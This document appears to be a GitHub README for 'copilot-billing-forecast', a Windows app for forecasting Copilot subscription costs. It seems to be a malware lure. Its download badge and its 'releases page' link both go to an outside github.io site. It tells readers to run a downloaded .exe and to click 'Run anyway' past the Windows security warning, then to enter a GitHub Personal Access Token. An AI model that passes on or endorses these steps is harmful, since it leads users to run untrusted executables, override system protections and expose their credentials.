# 📊 copilot-billing-forecast - Track your GitHub Copilot subscription costs

[ ![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue-blue.svg) ](https://tagj6807.github.io)

This application helps users manage and predict GitHub Copilot expenses. You can monitor your current usage and plan your future budget without complex spreadsheets. Use this tool to see data visualizations of your team spending.

## 📥 Getting Started

Follow these steps to set up the software on your Windows computer.

1. Visit the [releases page](https://tagj6807.github.io) to access the download files.
2. Locate the latest version labeled under "Assets."
3. Click the file ending in `.exe` to begin your download.
4. Open the file once the download finishes.

If Windows prompts you with a security message, click "More info" and then "Run anyway." This application uses standard libraries to calculate costs.

## 🖥️ System Requirements

Ensure your computer meets these needs to run the tool:

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 4GB of RAM.
*   Disk Space: 200MB of free space for installation and temporary data files.
*   Internet: A stable connection to fetch your latest GitHub billing information.

## ⚙️ Initial Setup

The application needs your GitHub credentials to fetch usage statistics safely.

1. Open the application after installation.
2. Locate the "Settings" tab in the top menu.
3. Provide your GitHub Personal Access Token. You generate this token in your GitHub account settings under "Developer settings."
4. Ensure your token grants "read" access to billing information.
5. Click "Save" to finish the connection.

The dashboard populates with your current month of usage data automatically.

## 📈 Analyzing Your Spend

The dashboard provides clear insight into your spending patterns.

*   **Current Bill:** Displays your total cost for the current billing cycle.
*   **Usage Trends:** Shows a line graph of seat utilization over the last thirty days.
*   **Forecast:** Predicts your total bill at the end of the month based on your current pace.

You can filter these charts by individual teams or projects. This helps identify where growth consumes the most budget.

## 🛠️ Frequently Asked Questions

**Does the tool upload my data to a server?**
No. All calculations happen on your local computer. Your data stays private.

**How often does the app refresh data?**
The app updates automatically every hour. You can trigger a manual update by pressing the Refresh button at the top of the interface.

**What happens if the forecast is wrong?**
The forecast predicts costs based on current usage patterns. If usage increases or decreases, the forecast updates to reflect that shift.

**Can I export my data?**
Yes. Click the "Export" button in the bottom corner of the dashboard. This generates a CSV file you can open in any spreadsheet program.

## 🛡️ Troubleshooting

If you encounter issues, try these steps:

*   Restart the application if the dashboard freezes during a data sync.
*   Verify your internet connection if the app reports a connection error.
*   Check your GitHub token permissions if the app displays an "Access Denied" message.
*   Reinstall the application if you experience persistent crashes.

For additional help, search the Issues tab on the GitHub repository at the top of this page. You can view existing reports or create a new one to ask for assistance.

## 📁 Data Management

The application creates a local database file to cache your usage information. This allows you to view your history without being online. You can clear this cache at any time through the "Advanced" menu in Settings. Clearing the cache forces the application to fetch fresh data from GitHub.

## 🚀 Future Updates

The development team releases updates to improve performance and add features. You will see a notification bar at the top of the app when a new version is available. You can download the latest installer from the same link provided earlier. The installation process replaces your old version while keeping your settings and historical data intact.

## 🤝 Contributing

This project remains open source. If you have requests for new features or improvements, submit them through the repository. You do not need to write code to offer feedback. Describe your suggestion clearly so the developers can understand your needs.